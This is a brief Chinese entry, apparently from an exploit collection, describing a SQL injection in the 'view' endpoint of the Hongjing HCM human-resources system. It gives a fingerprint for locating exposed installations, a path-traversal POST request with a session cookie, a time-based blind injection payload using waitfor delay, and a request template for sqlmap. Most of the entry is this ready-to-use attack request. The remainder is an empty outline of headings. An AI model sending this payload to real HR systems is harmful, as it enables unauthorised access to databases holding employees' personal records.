# 宏景人力资源信息管理系统view存在SQL注入漏洞

- **系统**：宏景人力资源信息管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="宏景 HCM"`
- **请求**：`POST /templates/attestation/../../general/info/view HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=BD60CDF0E7053E9C5BB173252D82A0FE`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 40`

**请求体 / payload**
```
kind=1&a0100=1';waitfor+delay+'0:0:3'+--

sqlmap
POST /templates/attestation/../../general/info/view HTTP/1.1
Host:
Cookie: JSESSIONID=BD60CDF0E7053E9C5BB173252D82A0FE
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
kind=1&a0100=1
```

**其他**
- 宏景人力资源信息管理系统view存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 宏景人力资源信息管理系统